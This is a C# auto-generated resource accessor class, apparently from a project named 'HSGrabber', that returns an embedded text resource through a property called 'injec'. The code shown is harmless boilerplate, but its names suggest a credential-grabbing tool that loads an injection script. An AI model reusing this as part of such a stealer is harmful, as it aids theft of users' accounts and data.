using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.Globalization;
using System.Resources;
using System.Runtime.CompilerServices;
using HSGrabber;
using HSGrabber.Properties;

namespace HSGrabber_Injec
{
	[GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "16.0.0.0")]
	[DebuggerNonUserCode]
	[CompilerGenerated]
	internal class Injec
	{
		internal Injec()
		{
		}

		[EditorBrowsable(EditorBrowsableState.Advanced)]
		internal static ResourceManager ResourceManager
		{
			get
			{
				bool flag = Injec.resourceMan == null;
				if (flag)
				{
					Injec.resourceMan = new ResourceManager("HSGrabber.Injec", typeof(Injec).Assembly);
				}
				return Injec.resourceMan;
			}
		}

		[EditorBrowsable(EditorBrowsableState.Advanced)]
		internal static CultureInfo Culture
		{
			get
			{
				return Injec.resourceCulture;
			}
			set
			{
				Injec.resourceCulture = value;
			}
		}

		internal static string injec
		{
			get
			{
				return Resources.ResourceManager.GetString("TextFile1");
			}
		}

		private static ResourceManager resourceMan;

		private static CultureInfo resourceCulture;
	}
}
